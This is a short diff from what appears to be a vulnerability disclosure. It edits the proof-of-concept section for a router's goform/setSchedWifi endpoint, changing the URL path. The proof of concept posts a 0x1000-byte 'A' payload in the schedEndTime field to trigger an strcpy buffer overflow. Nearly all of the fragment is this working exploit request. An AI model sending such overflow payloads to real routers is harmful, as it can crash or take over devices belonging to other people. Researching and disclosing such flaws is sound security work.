@@ -25,7 +25,7 @@ as follow we set, get into line 74, call strcpy, cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/setSchedWifi"
+url = "http://192.168.1.13/goform/openSchedWifi"
 payload = 'A'*0x1000 + '\n'
 
 r = requests.post(url, data={'schedEndTime': payload, 'schedWifiEnable': 0})
